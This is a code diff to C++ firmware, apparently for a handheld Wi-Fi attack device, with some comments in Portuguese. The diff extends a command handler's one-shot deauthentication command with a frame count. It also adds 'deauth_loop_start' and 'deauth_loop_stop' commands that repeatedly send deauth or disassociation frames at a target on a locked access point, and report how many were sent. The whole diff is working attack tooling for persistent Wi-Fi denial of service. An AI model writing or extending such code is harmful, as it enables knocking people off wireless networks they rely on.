@@ -41,6 +41,8 @@ String CommandHandler::handle(const String &line) {
   if (cmd == "sniff_poll") return doSniffPoll();
   if (cmd == "sniff_stats") return doSniffStats();
   if (cmd == "deauth") return doDeauth(req);
+  if (cmd == "deauth_loop_start") return doDeauthLoopStart(req);
+  if (cmd == "deauth_loop_stop") return doDeauthLoopStop();
   return errorJson("unknown_cmd");
 }
 
@@ -123,6 +125,13 @@ String CommandHandler::doStatus() {
     target["ssid"] = wifi_.lockedSsid();
     target["bssid"] = wifi_.lockedBssidString();
     target["channel"] = wifi_.lockedChannel();
+  }
+
+  if (wifi_.deauthLoopActive()) {
+    JsonObject loop = doc["deauth_loop"].to<JsonObject>();
+    loop["target"] = wifi_.deauthLoopTargetString();
+    loop["interval_ms"] = wifi_.deauthLoopInterval();
+    loop["sent"] = wifi_.deauthLoopSent();
   }
 
   String out;
@@ -278,8 +287,10 @@ String CommandHandler::doDeauth(JsonVariantConst req) {
   uint16_t reason = req["reason"] | 1;
   String type = req["type"] | "deauth";  // "deauth" (padrao) ou "disassoc"
   if (type != "deauth" && type != "disassoc") return errorJson("invalid_type");
+  uint32_t count = req["count"] | 1;     // one-shot: quantos frames mandar
+  if (count > 100) count = 100;          // teto baixo; pra manter fora use deauth_loop_start
 
-  bool ok = wifi_.sendDeauth(target, reason, type);
+  bool ok = wifi_.sendDeauth(target, reason, type, (uint16_t)count);
 
   JsonDocument doc;
   doc["ok"] = ok;
@@ -291,8 +302,57 @@ String CommandHandler::doDeauth(JsonVariantConst req) {
   deauth["target"] = target;
   deauth["reason"] = reason;
   deauth["type"] = type;
+  deauth["count"] = count;
   deauth["bssid"] = wifi_.lockedBssidString();
   if (!ok) doc["error"] = "deauth_failed_check_lock";
+
+  String out;
+  serializeJson(doc, out);
+  return out;
+}
+
+String CommandHandler::doDeauthLoopStart(JsonVariantConst req) {
+  String target = req["target"] | "";
+  if (target.length() == 0) return errorJson("missing_target");
+  uint16_t reason = req["reason"] | 1;
+  String type = req["type"] | "deauth";
+  if (type != "deauth" && type != "disassoc") return errorJson("invalid_type");
+  uint32_t interval = req["interval"] | 200;  // ms entre cada reenvio
+
+  bool ok = wifi_.startDeauthLoop(target, reason, type, interval);
+
+  JsonDocument doc;
+  doc["ok"] = ok;
+  doc["state"] = wifi_.stateName();
+  JsonObject docObj = doc.as<JsonObject>();
+  writePmf(docObj, wifi_.sniffPmf());
+
+  if (ok) {
+    JsonObject loop = doc["deauth_loop"].to<JsonObject>();
+    loop["target"] = target;
+    loop["reason"] = reason;
+    loop["type"] = type;
+    loop["interval_ms"] = wifi_.deauthLoopInterval();
+    loop["bssid"] = wifi_.lockedBssidString();
+  } else {
+    doc["error"] = "need_lock_and_valid_target";
+  }
+
+  String out;
+  serializeJson(doc, out);
+  return out;
+}
+
+String CommandHandler::doDeauthLoopStop() {
+  uint32_t sent = wifi_.deauthLoopSent();
+  wifi_.stopDeauthLoop();
+
+  JsonDocument doc;
+  doc["ok"] = true;
+  doc["state"] = wifi_.stateName();
+  JsonObject loop = doc["deauth_loop"].to<JsonObject>();
+  loop["active"] = false;
+  loop["sent"] = sent;
 
   String out;
   serializeJson(doc, out);
